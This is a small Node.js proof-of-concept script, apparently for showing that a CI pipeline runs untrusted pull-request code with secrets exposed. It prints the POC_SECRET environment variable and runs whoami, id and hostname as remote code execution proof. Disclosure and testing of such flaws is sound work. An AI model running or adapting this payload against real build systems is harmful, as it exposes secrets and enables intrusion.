const { execSync } = require("child_process");
console.log("POC - secret reached untrusted-ref code:", process.env.POC_SECRET);
console.log("RCE-PROOF user=" + execSync("whoami").toString().trim());
console.log("RCE-PROOF id=" + execSync("id").toString().trim());
console.log("RCE-PROOF host=" + execSync("hostname").toString().trim());
